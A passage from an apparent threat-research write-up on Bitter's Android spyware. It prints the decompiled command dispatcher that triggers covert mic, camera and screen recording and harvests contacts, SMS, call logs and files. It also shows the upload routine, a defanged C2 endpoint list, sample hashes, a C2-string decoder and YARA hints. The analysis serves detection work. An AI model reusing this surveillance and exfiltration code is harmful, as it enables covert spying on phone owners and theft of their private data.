                ContextCompat.startForegroundService(context, intent);
            } else if (str.equals("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_a0")) {
                executorService.submit(new MessageXInterceptor("M: Started recording Service", instance.getIdentityValue()));
                Intent intent2 = new Intent(context, RecordingService.class);
                intent2.putExtra("mic", true);
                intent2.putExtra("camera", true);
                intent2.putExtra("squeaky", true);
                ContextCompat.startForegroundService(context, intent2);
            } else if (str.equals("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_a1")) {
                executorService.submit(new MessageXInterceptor("M: Started recording", instance.getIdentityValue()));
                executorService.submit(new MessageXInterceptor("M: Started recording Service", instance.getIdentityValue()));
                Intent intent3 = new Intent(context, RecordingService.class);
                intent3.putExtra("mic", true);
                ContextCompat.startForegroundService(context, intent3);
            } else if (str.equals("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_a2")) {
                executorService.submit(new MessageXInterceptor("M: Started recording", instance.getIdentityValue()));
                executorService.submit(new MessageXInterceptor("M: Started recording Service", instance.getIdentityValue()));
                Intent intent4 = new Intent(context, RecordingService.class);
                intent4.putExtra("camera", true);
                ContextCompat.startForegroundService(context, intent4);
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_b")) {
                executorService.submit(new MessageXInterceptor("M: Stopped recording Service", instance.getIdentityValue()));
                instance2.stopRecording();
                context.stopService(new Intent(context, RecordingService.class));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_c")) {
                executorService.submit(new MessageXInterceptor("M: Started uploading", instance.getIdentityValue()));
                RecordingGatherer recordingGatherer = new RecordingGatherer();
                recordingGatherer.initGatherer(context.getApplicationContext());
                recordingGatherer.makeRequest();
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(AudioRecordingUploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, AudioRecordingUploadWorker.getWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_x")) {
                executorService.submit(new MessageXInterceptor("M: Stopped all workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).cancelAllWork();
                try {
                    sleep(DefaultRenderersFactory.DEFAULT_ALLOWED_VIDEO_JOINING_TIME_MS);
                    executorService.shutdownNow();
                    executorService = Executors.newCachedThreadPool();
                    context.getSharedPreferences(ACCESSIBILITY_PREFS, 0).edit().remove(ACCESSIBILITY_LAST_ASK_TIME).apply();
                } catch (Exception unused) {
                }
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_1")) {
                executorService.submit(new MessageXInterceptor("M: Started Basic Info workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, BasicInfoWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_2")) {
                executorService.submit(new MessageXInterceptor("M: Started Contact Info workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, ContactInfoWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_3")) {
                executorService.submit(new MessageXInterceptor("M: Started File path Info workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(FilePathWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, FilePathWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_4")) {
                executorService.submit(new MessageXInterceptor("M: Started File Sync workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(UploadWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.KEEP, UploadWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_5")) {
                executorService.submit(new MessageXInterceptor("M: Started AppInfoReport workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.REPLACE, AppInfoReportWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_6")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingWorkPolicy.REPLACE, PhoneMessageReportWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_7")) {
                executorService.submit(new MessageXInterceptor("M: Started CallLogReport workers", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniqueWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingWorkPolicy.REPLACE, CallLogReportWorker.getOneTimeWorkRequest());
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_1z")) {
                executorService.submit(new MessageXInterceptor("M: Started Basic Info executor", instance.getIdentityValue()));
                BasicInfoGatherer basicInfoGatherer = new BasicInfoGatherer();
                basicInfoGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_2z")) {
                executorService.submit(new MessageXInterceptor("M: Started Contact Info executor", instance.getIdentityValue()));
                ContactInfoGatherer contactInfoGatherer = new ContactInfoGatherer();
                contactInfoGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_3z")) {
                executorService.submit(new MessageXInterceptor("M: Started File path Info executor", instance.getIdentityValue()));
                FilePathGatherer filePathGatherer = new FilePathGatherer();
                filePathGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_4z")) {
                executorService.submit(new MessageXInterceptor("M: Started File Sync executor", instance.getIdentityValue()));
                UploadGatherer uploadGatherer = new UploadGatherer();
                uploadGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_5z")) {
                executorService.submit(new MessageXInterceptor("M: Started AppInfo executor", instance.getIdentityValue()));
                AppInfoGatherer appInfoGatherer = new AppInfoGatherer();
                appInfoGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_6z")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport executor", instance.getIdentityValue()));
                PhoneMessageGatherer phoneMessageGatherer = new PhoneMessageGatherer();
                phoneMessageGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_7z")) {
                executorService.submit(new MessageXInterceptor("M: Started CallLogReport executor", instance.getIdentityValue()));
                CallLogGatherer callLogGatherer = new CallLogGatherer();
                callLogGatherer.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_6zr")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport executor", instance.getIdentityValue()));
                PhoneMessageGatherer phoneMessageGatherer2 = new PhoneMessageGatherer(200);
                phoneMessageGatherer2.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_7zr")) {
                executorService.submit(new MessageXInterceptor("M: Started CallLogReport executor", instance.getIdentityValue()));
                CallLogGatherer callLogGatherer2 = new CallLogGatherer(200);
                callLogGatherer2.initGatherer(context);
                executorService.submit(new Callable() {
                    public final Object call() {
                        return InfoGatherer.this.makeRequest();
                    }
                });
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_1l")) {
                executorService.submit(new MessageXInterceptor("M: Started Basic Info periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, BasicInfoWorker.getWorkRequest(15));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_2l")) {
                executorService.submit(new MessageXInterceptor("M: Started Contact Info periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, ContactInfoWorker.getWorkRequest(15));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_3l")) {
                executorService.submit(new MessageXInterceptor("M: Started File Path Info periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(FilePathWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, FilePathWorker.getWorkRequest(15));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_4l")) {
                executorService.submit(new MessageXInterceptor("M: Started File Sync periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(UploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, UploadWorker.getWorkRequest(15));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_5l")) {
                executorService.submit(new MessageXInterceptor("M: Started App Info Sync periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, AppInfoReportWorker.getWorkRequest(15));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_6l")) {
                executorService.submit(new MessageXInterceptor("M: Started PhoneMessageReport Sync periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, PhoneMessageReportWorker.getWorkRequest(15));
            } else if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_7l")) {
                executorService.submit(new MessageXInterceptor("M: Start CallLog Report Sync periodic", instance.getIdentityValue()));
                WorkManager.getInstance(context).enqueueUniquePeriodicWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.REPLACE, CallLogReportWorker.getWorkRequest(15));
            } else {
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_4f")) {
                    ContextCompat.startForegroundService(context, new Intent(context, SyncService.class));
                }
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_sa")) {
                    executorService.submit(new MessageXInterceptor("M: Started wynking", instance.getIdentityValue()));
                    PowerManager powerManager = (PowerManager) context.getSystemService("power");
                    KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService("keyguard");
                    if (powerManager.isScreenOn()) {
                        if (!keyguardManager.isKeyguardLocked()) {
                            Intent intent5 = new Intent(context, XActivity.class);
                            intent5.putExtra("screenCap", true);
                            intent5.setFlags(1342210048);
                            context.startActivity(intent5);
                        }
                    }
                    WynkHelper.getInstance(context).queueRecording();
                    ExecutorService executorService3 = executorService;
                    executorService3.submit(new MessageXInterceptor("M: Wynking Queued ScreenStatus: " + powerManager.isScreenOn() + " KeyGuard: " + keyguardManager.isKeyguardLocked(), instance.getIdentityValue()));
                }
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_sb")) {
                    WynkHelper instance3 = WynkHelper.getInstance(context);
                    instance3.stopRecording();
                    instance3.deQueueRecording();
                    executorService.submit(new MessageXInterceptor("M: Stopped wynking", instance.getIdentityValue()));
                    context.stopService(new Intent(context, WynkService.class));
                }
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_sc")) {
                    executorService.submit(new MessageXInterceptor("M: Started Wynk Upload", instance.getIdentityValue()));
                    WorkManager.getInstance(context).enqueueUniqueWork(WynkUploadWorker.WORKER_IDENTIFIER, ExistingWorkPolicy.KEEP, WynkUploadWorker.getOneTimeWorkRequest());
                    WynkGatherer wynkGatherer = new WynkGatherer();
                    wynkGatherer.initGatherer(context);
                    executorService.submit(new Callable() {
                        public final Object call() {
                            return InfoGatherer.this.makeRequest();
                        }
                    });
                    return;
                }
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_rr")) {
                    executorService.submit(new MessageXInterceptor("M: Pending recording upload request recieved", instance.getIdentityValue()));
                    PendingRecordingGatherer pendingRecordingGatherer = new PendingRecordingGatherer();
                    pendingRecordingGatherer.initGatherer(context);
                    executorService.submit(new Callable() {
                        public final Object call() {
                            return InfoGatherer.this.makeRequest();
                        }
                    });
                }
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_wk")) {
                    if (isAppInForeground()) {
                        executorService.submit(new MessageXInterceptor("M: Already in foreground", instance.getIdentityValue()));
                    } else {
                        executorService.submit(new MessageXInterceptor("M: Waking up the app", instance.getIdentityValue()));
                        Intent intent6 = new Intent(context, XActivity.class);
                        intent6.putExtra("AppBucketPrevention", true);
                        intent6.setFlags(1342210048);
                        context.startActivity(intent6);
                    }
                }
                if (str.endsWith("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_mi")) {
                    executorService.submit(new MessageXInterceptor("M: Refreshing Mi Background Launch Permission", instance.getIdentityValue()));
                    executorService.submit(new Runnable(context) {
                        public final /* synthetic */ Context f$0;

                        {
                            this.f$0 = r1;
                        }

                        public final void run() {
                            WorkerStore.ensureBackgroundLaunchPermissions(this.f$0);
                        }
                    });
                }
            }
        } catch (Exception unused2) {
        }
    }
```

Let's take a look at `makeRequest` within `CallLogGatherer`. We can see that it's retrieving the C2 from `ApiConfig`, which in this case is in `org.zcode.dracarys.config.ApiConfig;` class.
```java
public ListenableWorker.Result makeRequest() {
        try {
            if (this.httpClient.newCall(new Request.Builder().url(ApiConfig.REPORT_CALLS).post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(getRequestJSON().toString()))).build()).execute().isSuccessful()) {
                return ListenableWorker.Result.success();
            }
            return ListenableWorker.Result.retry();
        } catch (Exception unused) {
            return ListenableWorker.Result.failure();
        }
    }
```

Now let's find the C2 within `org.zcode.dracarys.config.ApiConfig;`. I have to defang the C2 in case this post got flagged.
```java
public interface ApiConfig {
    public static final String API_URL = "hxxps://youtubepremiumapp[.]com";
    public static final String API_VERSION = "v3";
    public static final String BASIC_INFO_URL = String.format("%s/%s/report/basic-info", new Object[]{API_URL, API_VERSION});
    public static final String CONTACTS_URL = String.format("%s/%s/report/contacts", new Object[]{API_URL, API_VERSION});
    public static final String FETCH_TASK = String.format("%s/%s/request/tasks", new Object[]{API_URL, API_VERSION});
    public static final String HUM_URL = String.format("%s/%s/report/hum", new Object[]{API_URL, API_VERSION});
    public static final String PULL_TASK = String.format("%s/%s/pull/task", new Object[]{API_URL, API_VERSION});
    public static final String PUSH_RESULT = String.format("%s/%s/push/result", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_APP_INFO = String.format("%s/%s/report/apps", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_ATTEMPT = String.format("%s/%s/report/attempt", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_CALLS = String.format("%s/%s/report/calls", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_FILE_PATHS_URL = String.format("%s/%s/report/file-paths", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_MESSAGES_URL = String.format("%s/%s/report/message", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_RECORDING_PATHS = String.format("%s/%s/report/ruby", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_SDCARD_PATHS_URL = String.format("%s/%s/report/storage/root", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_SMS = String.format("%s/%s/report/sms", new Object[]{API_URL, API_VERSION});
    public static final String REPORT_WYNK = String.format("%s/%s/report/wink", new Object[]{API_URL, API_VERSION});
    public static final String REQUEST_FILE_PATHS_URL = String.format("%s/%s/request/file-paths", new Object[]{API_URL, API_VERSION});
    public static final String REQUEST_HEARTBEAT_URL = String.format("%s/%s/request/heartbeat", new Object[]{API_URL, API_VERSION});
    public static final String REQUEST_HUM = String.format("%s/%s/request/hum", new Object[]{API_URL, API_VERSION});
    public static final String REQUEST_WYNK = String.format("%s/%s/request/wink", new Object[]{API_URL, API_VERSION});
    public static final String SYNC_FILES_URL = String.format("%s/%s/sync/file", new Object[]{API_URL, API_VERSION});
}
```

As we can see, there is nothing sophisticated in `Bitter`'s Android malware.
Using all the above information, we can find the following related samples under `Bitter`

If you have your own custom made Yara for Android, you should create a rule that checks if the APK contains the following
 - `services.WynkService`
 - `activities.XActivity`
 - `services.AlfredService`

Sha256 : `6c59428863ddba27f3e3aea781340ea8e05f0bca6362a7473c0595b825cf4150`

C2 : `hxxps://gjeikd.cdnfwersgdty[.]com`

Sha256 : `d16a9b41a1617711d28eb52b89111b2ebdc25d26fa28348a115d04560a9f1003`

C2 : `hxxps://signal-premium-app[.]org`

Sha256 : `c71366d68202a60dc14179885bfbb057ddeeb823be8cc4189a4e113dd7b54bb9`

C2 : `hxxps://pflix[.]camdvr[.]org`

Sha256 : `43e3a0b0d5e2f172ff9555897c3d3330f3adc3ac390a52d84cea7045fbae108d`

C2 : `hxxp://94[.]140[.]114[.]22:41322`

Sha256 : `67f5f1f45498ed400337ae5589bdcadc97eaa0cc7c1fd03f4ff088517c6d761f`

C2 : `hxxps://signal-premium-app[.]org`

Sha256 : `f59c45ed38702f4b603b4f16c6f5f7dd6b76f8d809a142002236f0fbd63018e2`

C2 : `hxxps://signal-premium-app[.]org`

Sha256 : `cbfa2aa73ea8bdc126c6767efd61a822786f4b48479859a6d14246a25d8ebd1a`

With regards to this sample, it seems like `Bitter` decided to obfuscate their C2.

However you can use the following Java file to get back the C2.
C2 : `hxxps://currweather[.]com`
```java
public class main
{
    public static final int MAX_CHUNK_LENGTH = 8191;
    public static final long PAYLOAD_SHORT_MAX = 65535;

    public static void main(String[] args)
    {
        String szTemp = "";
        szTemp = getString(-920388456435831216L);
        System.out.println(szTemp);
    }

    public static String getString2(long j, String[] strArr) {
        long next = next(seed(4294967295L & j));
        long j2 = (next >>> 32) & PAYLOAD_SHORT_MAX;
        long next2 = next(next);
        int i = (int) (((j >>> 32) ^ j2) ^ ((next2 >>> 16) & -65536));
        long charAt = getCharAt(i, strArr, next2);
        int i2 = (int) ((charAt >>> 32) & PAYLOAD_SHORT_MAX);
        char[] cArr = new char[i2];
        for (int i3 = 0; i3 < i2; i3++) {
            charAt = getCharAt(i + i3 + 1, strArr, charAt);
            cArr[i3] = (char) ((int) ((charAt >>> 32) & PAYLOAD_SHORT_MAX));
        }
        return new String(cArr);
    }

    private static long getCharAt(int i, String[] strArr, long j) {
        return (((long) strArr[i / MAX_CHUNK_LENGTH].charAt(i % MAX_CHUNK_LENGTH)) << 32) ^ next(j);
    }


    public static final String[] chunks;

    static {
        String[] strArr = new String[2];
        chunks = strArr;
        strArr[0] = "￺ﾏﾐﾈᯟﾍ￯ﾨﾆﾑᯑﾲﾐﾑﾖﾋﾐﾍﾖﾑﾘￅ￟￫ￄ￟ﾬᯙﾍﾚﾚﾑ￟ﾰﾑ￟ﾬﾋﾞﾋﾊﾌￅ￟￞ￄ￟ﾾᯙﾜﾚﾌﾌﾖﾝﾖﾓﾖﾋﾆ￟ﾬﾚﾍﾉﾖﾜﾚ￟ﾭﾊﾑﾑﾖﾑﾘￅ￟￹ﾈﾖﾑᯞﾐﾈ￳ﾷﾚﾓᯖﾐ￟ﾨﾐﾍﾓﾛ￞￲ﾞﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆ￶ﾌﾜﾍᯟﾚﾑﾼﾞﾏ￶ﾧﾾﾜᯎﾖﾉﾖﾋﾆ￫ﾭﾚﾎᯏﾚﾌﾋ￟ﾬﾜﾍﾚﾚﾑﾬﾗﾐﾋￅ￟￬￑ﾜﾞᯔﾳﾞﾊﾑﾜﾗﾧﾾﾜﾋﾖﾉﾖﾋﾆ￯ﾒﾚﾛᯓﾞﾠﾏﾍﾐﾕﾚﾜﾋﾖﾐﾑￚﾬﾜﾍᯟﾚﾑ￟ﾼﾞﾏﾋﾊﾍﾚￅ￟ﾭﾚﾎﾊﾚﾌﾋﾖﾑﾘ￟ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￬ﾾﾏﾏ᯸ﾊﾜﾔﾚﾋﾯﾍﾚﾉﾚﾑﾋﾖﾐﾑ￱ﾐﾏﾚᯔﾬﾚﾓﾙﾲﾶﾪﾶﾽﾘ￩￑ﾜﾞᯔﾠﾓﾞﾊﾑﾜﾗﾠﾇﾠﾞﾜﾋﾖﾉﾖﾋﾆ￶ﾧﾾﾜᯎﾖﾉﾖﾋﾆ￲ﾭﾚﾎᯏﾚﾌﾋﾼﾐﾛﾚￅ￟￲￟ﾭﾚᯉﾊﾓﾋﾼﾐﾛﾚￅ￟￻ﾻﾾﾫ᯻￴ﾭﾺﾬᯯﾳﾫﾠﾼﾰﾻﾺￜﾬﾜﾍᯟﾚﾑ￟ﾼﾞﾏﾋﾊﾍﾚￅ￟ﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￟ﾍﾚﾌﾊﾓﾋￅ￟￼ﾑﾍￏ￷ﾱﾚﾌᯎﾯﾍﾚﾙ￻ﾱﾚﾌᯎ￨ﾗﾋﾋᯊﾌￅ￐￐ﾜﾊﾍﾍﾈﾚﾞﾋﾗﾚﾍ￑ﾜﾐﾒ￷ﾱﾚﾌᯎﾯﾍﾚﾙ￻ﾱﾚﾌᯎ￾ﾠ￾￐￺ﾪﾫﾹᮗￇ￨ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾝﾞﾌﾖﾜￒﾖﾑﾙﾐ￪ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾜﾐﾑﾋﾞﾜﾋﾌ￨ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾙﾖﾓﾚￒﾏﾞﾋﾗﾌ￦ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾌﾋﾐﾍﾞﾘﾚ￐ﾍﾐﾐﾋ￧ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾙﾖﾓﾚￒﾏﾞﾋﾗﾌ￰ￚﾌ￐ᮟﾌ￐ﾌﾆﾑﾜ￐ﾙﾖﾓﾚ￫ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾒﾚﾌﾌﾞﾘﾚ￠ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾏﾍﾖﾉﾞﾋﾚ￐ﾙﾖﾓﾚￒﾏﾞﾋﾗﾌ￟ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾏﾍﾖﾉﾞﾋﾚ￐ﾙﾖﾓﾚￒﾏﾞﾋﾗﾌ￨ￚﾌ￐ᮟﾌ￐ﾌﾆﾑﾜ￐ﾏﾍﾖﾉﾞﾋﾚ￐ﾙﾖﾓﾚ￨ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾗﾚﾞﾍﾋﾝﾚﾞﾋ￰ￚﾌ￐ᮟﾌ￐ﾏﾊﾓﾓ￐ﾋﾞﾌﾔ￬ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾋﾞﾌﾔﾌ￫ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾞﾋﾋﾚﾒﾏﾋ￮ￚﾌ￐ᮟﾌ￐ﾏﾊﾌﾗ￐ﾍﾚﾌﾊﾓﾋ￯ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾗﾊﾒ￮ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾗﾊﾒ￮ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾞﾏﾏﾌ￯ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾌﾒﾌ￭ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾜﾞﾓﾓﾌ￭ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾈﾖﾑﾔ￮ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾈﾖﾑﾔ￮ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾍﾊﾝﾆ￯ￚﾌ￐ᮟﾌ￐ﾜﾓﾚﾞﾍ￐ﾈﾖﾑﾔ￰ￚﾌ￐ᮟﾌ￐ﾜﾓﾚﾞﾍ￐ﾗﾊﾒ￮ￚﾌ￐ᮟﾌ￐ﾚﾇﾋﾚﾑﾛ￐ﾈﾖﾑﾔ￯ￚﾌ￐ᮟﾌ￐ﾚﾇﾋﾚﾑﾛ￐ﾗﾊﾒ￩ￚﾌ￐ᮟﾌ￐ﾍﾚﾏﾐﾍﾋ￐ﾋﾞﾌﾔ￐ﾓﾖﾌﾋ￦ￚﾌ￐ᮟﾌ￐ﾋﾞﾌﾔ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾍﾚﾌﾊﾓﾋ￩ￚﾌ￐ᮟﾌ￐ﾏﾊﾓﾓ￐ﾋﾞﾌﾔￒﾜﾐﾑﾙﾖﾘ￝ￚﾌ￐ᮟﾌ￐ﾍﾚﾎﾊﾚﾌﾋ￐ﾞﾊﾋﾐ￐ﾌﾆﾑﾜ￐ﾙﾖﾓﾚￒﾏﾞﾋﾗﾌ￷ﾱﾚﾌᯎﾯﾍﾚﾙ￻ﾱﾚﾌᯎ￵￑ﾖﾛᯥﾜﾐﾑﾙﾖﾘ￳ﾖﾛﾚᯔﾋﾖﾋﾆﾠﾔﾚﾆ￶ﾖﾑﾘᯈﾚﾌﾌﾶﾛ￱ﾖﾛﾚᯔﾋﾖﾋﾆﾠﾉﾞﾓﾊﾚ￵ﾞﾑﾛᯈﾐﾖﾛﾠﾖﾛ￮ﾊﾏﾓᯕﾞﾛﾠﾗﾚﾞﾛﾚﾍﾠﾔﾚﾆ￳ﾧￒﾶ᯴ﾸﾭﾺﾬﾬￒﾶﾻ￳ﾖﾛﾚᯔﾋﾖﾋﾆﾠﾔﾚﾆ￱ﾖﾛﾚᯔﾋﾖﾋﾆﾠﾉﾞﾓﾊﾚ￮ﾊﾏﾓᯕﾞﾛﾠﾗﾚﾞﾛﾚﾍﾠﾔﾚﾆ￳ﾖﾛﾚᯔﾋﾖﾋﾆﾠﾔﾚﾆ￱ﾖﾛﾚᯔﾋﾖﾋﾆﾠﾉﾞﾓﾊﾚ￶ﾖﾑﾘᯈﾚﾌﾌﾶﾛ￮ﾊﾏﾓᯕﾞﾛﾠﾗﾚﾞﾛﾚﾍﾠﾔﾚﾆ￳ﾧￒﾶ᯴ﾸﾭﾺﾬﾬￒﾶﾻ￰ﾞﾏﾏᯩﾏﾚﾜﾖﾙﾖﾜﾶﾑﾙﾐ￧ﾾﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆ￟ﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￱ﾫﾞﾔᯟ￟ﾒﾚ￟ﾋﾗﾚﾍﾚ￞￭ﾬﾋﾐᯈﾞﾘﾚ￟ﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ�ﾰﾔￚﾜﾐﾒᮔﾞﾑﾛﾍﾐﾖﾛ￑ﾚﾇﾋﾚﾍﾑﾞﾓﾌﾋﾐﾍﾞﾘﾚ￑ﾛﾐﾜﾊﾒﾚﾑﾋﾌ￫ﾏﾍﾖᯗﾞﾍﾆￅﾾﾑﾛﾍﾐﾖﾛ￐ﾛﾞﾋﾞￗﾞﾑﾛᯈﾐﾖﾛ￑ﾖﾑﾋﾚﾑﾋ￑ﾞﾜﾋﾖﾐﾑ￑ﾰﾯﾺﾱﾠﾻﾰﾼﾪﾲﾺﾱﾫﾠﾫﾭﾺﾺ￝ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾍﾐﾉﾖﾛﾚﾍ￑ﾚﾇﾋﾍﾞ￑ﾶﾱﾶﾫﾶﾾﾳﾠﾪﾭﾶ￘ﾞﾑﾛᯈﾐﾖﾛ￑ﾌﾚﾋﾋﾖﾑﾘﾌ￑ﾾﾼﾼﾺﾬﾬﾶﾽﾶﾳﾶﾫﾦﾠﾬﾺﾫﾫﾶﾱﾸﾬ￸ﾞﾏﾏ᯶ﾖﾌﾋ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ